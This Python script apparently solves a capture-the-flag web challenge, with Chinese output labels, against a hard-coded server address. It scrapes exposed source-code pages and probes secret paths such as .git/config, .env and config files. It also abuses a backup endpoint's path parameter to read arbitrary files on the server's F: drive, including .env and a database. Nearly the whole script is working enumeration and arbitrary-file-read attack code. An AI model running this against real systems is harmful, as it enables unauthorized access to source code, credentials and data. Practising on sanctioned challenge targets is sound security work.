import requests
import re
import os
import html

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("获取并分析源码")
print("="*70)

# 获取上传源码
r = session.get(f"{TARGET}/upload-source", timeout=15)
if r.status_code == 200:
    source_match = re.search(r'<pre class="source-code">(.*?)</pre>', r.text, re.DOTALL)
    if source_match:
        source = html.unescape(source_match.group(1))
        print(f"\n完整上传源码:\n{source}")
        
        # 保存源码到文件
        with open("upload_source.txt", "w", encoding="utf-8") as f:
            f.write(source)
        print("\n源码已保存到 upload_source.txt")

# 搜索其他可能的源码路径
print("\n" + "="*70)
print("搜索其他源码路径")
print("="*70)

source_paths = [
    "/upload-source",
    "/ping-source",
    "/backup-source",
    "/search-source",
    "/login-source",
    "/include-source",
    "/message-source",
    "/dashboard-source",
]

for path in source_paths:
    try:
        r = session.get(f"{TARGET}{path}", timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"\n>>> {path}")
            print(f"内容: {r.text[:500]}")
            
            # 搜索flag
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

# 测试robots.txt和其他隐藏文件
print("\n" + "="*70)
print("测试隐藏文件")
print("="*70)

hidden_paths = [
    "/robots.txt",
    "/.htaccess",
    "/.git/config",
    "/flag.txt",
    "/FLAG",
    "/flag",
    "/secret.txt",
    "/.env",
    "/config.py",
    "/app.py",
    "/main.py",
]

for path in hidden_paths:
    try:
        r = session.get(f"{TARGET}{path}", timeout=10)
        if r.status_code == 200 and len(r.text) > 20:
            print(f"\n>>> {path}")
            print(f"状态码: {r.status_code}")
            print(f"内容: {r.text[:500]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

# 测试不同的文件名
print("\n" + "="*70)
print("测试Backup读取不同文件")
print("="*70)

file_paths = [
    "F:\\flag.txt",
    "F:\\FLAG.txt",
    "F:\\flag",
    "F:\\FLAG",
    "F:\\secret.txt",
    "F:\\secret",
    "F:\\ctf.txt",
    "F:\\CTF.txt",
    "F:\\small peoject\\flag.txt",
    "F:\\small peoject\\python-lab\\flag.txt",
    "F:\\small peoject\\python-lab\\FLAG.txt",
    "F:\\small peoject\\python-lab\\app.py",
    "F:\\small peoject\\python-lab\\main.py",
    "F:\\small peoject\\python-lab\\config.py",
    "F:\\small peoject\\python-lab\\.env",
    "F:\\small peoject\\python-lab\\database.db",
]

for path in file_paths:
    try:
        r = session.get(f"{TARGET}/backup", params={"path": path}, timeout=10)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                if len(content) > 10 and "Blocked" not in content:
                    print(f"\n>>> {path}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n测试完成")